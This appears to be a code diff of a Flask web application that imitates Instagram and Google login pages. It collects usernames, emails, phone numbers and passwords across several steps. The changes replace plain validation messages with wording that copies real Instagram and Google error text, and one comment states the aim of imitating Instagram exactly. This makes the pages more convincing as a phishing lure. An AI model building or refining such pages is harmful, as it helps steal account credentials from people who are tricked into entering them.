@@ -24,12 +24,14 @@ def insta_login():
     username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    # النمط يمنع الأحرف العربية تماماً ويسمح فقط بحروف إنجليزية وأرقام و _ ونقطة (من 4 إلى 30 حرف)
+    # الشرط البرمجي للفحص (يمنع العربي والمسافات ويقبل الإنجليزي فقط)
     username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
     if not re.match(username_pattern, username_val):
+      # رسالة واقعية تحاكي انستغرام تماماً
       error = (
-          "عذراً، اسم المستخدم يجب أن يكون بحروف إنجليزية فقط (ممنوع العربي)، وبدون مسافات، ومن 4 لـ 30 حرف."
+          "عذراً، اسم المستخدم الذي أدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
+          " اسم المستخدم ومحاولة مرة أخرى."
       )
     elif len(password) <= 5:
       error = (
@@ -136,7 +138,7 @@ def insta_login():
 
 
 # ----------------------------------------------------
-# 2. صفحة الخطأ 404 (تطلب تأكيد الحساب بدون مربعات وبخط أسود)
+# 2. صفحة الخطأ 404 (لون النص أسود)
 # ----------------------------------------------------
 @app.route("/error-404", methods=["GET", "POST"])
 def error_404():
@@ -159,9 +161,9 @@ def error_404():
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background: #ffffff; color: #000000; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; text-align: center; }
         .error-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; }
-        .error-code { font-size: 60px; font-weight: 700; color: #d93025; margin-bottom: 5px; }
-        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #202124; }
-        .error-desc { font-size: 14.5px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
+        .error-code { font-size: 60px; font-weight: 700; color: #000000; margin-bottom: 5px; }
+        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #000000; }
+        .error-desc { font-size: 14.5px; color: #000000; line-height: 1.6; margin-bottom: 30px; }
         .next-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 8px; padding: 13px; font-size: 15px; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
         .next-btn:hover { background: #1558b0; }
     </style>
@@ -193,7 +195,6 @@ def google_step1():
   if request.method == "POST":
     email_val = request.form.get("email", "").strip()
     
-    # النمط الجديد للبريد: يقبل الحروف الكبيرة والصغيرة مثل SAMER@gmail.com ويمنع الأحرف العربية كلياً
     email_pattern = r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
@@ -201,7 +202,8 @@ def google_step1():
         re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
       error = (
-          "البريد الإلكتروني غير صالح. ممنوع استخدام الحروف العربية، ويجب أن يكون بصيغة صحيحة مثل SAMER@gmail.com."
+          "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد"
+          " الإلكتروني أو رقم الهاتف."
       )
     else:
       session["google_email"] = email_val
@@ -332,7 +334,7 @@ def google_step2():
         .input-group { width: 100%; margin-bottom: 8px; }
         .input-group input { width: 100%; padding: 12px 14px; font-size: 15px; border: 1.5px solid #1a73e8; border-radius: 8px; outline: none; color: #202124; background: #fff; }
         .footer-action { width: 100%; max-width: 450px; display: flex; justify-content: flex-end; align-items: center; padding-bottom: 10px; }
-        .submit-btn { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
+        .submit-btn { background: #1a7328; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
         .submit-btn:hover { background: #1558b0; }
     </style>
 </head>
